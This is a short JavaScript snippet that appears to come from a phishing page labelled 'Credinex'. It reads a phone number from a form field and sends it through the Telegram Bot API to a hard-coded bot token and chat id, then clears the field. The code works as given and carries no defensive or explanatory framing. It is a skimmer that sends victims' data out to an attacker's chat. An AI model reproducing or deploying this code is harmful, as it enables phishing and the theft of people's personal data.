var telegram_bot_id = "7574296803%3AAAE_f4topknrug31kDeXaJb0DG9w5E0OxTo"
//chat id
var chat_id = 7015306286
var u_tel;
var ready = function submit() {
    u_tel = document.getElementById("hp").value;
    message = "[Credinex | No HP]\n \nNomor Hp: " + u_tel
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function(response){
        console.log('');
    });
    document.getElementById("hp").value = "";
    return false;
};
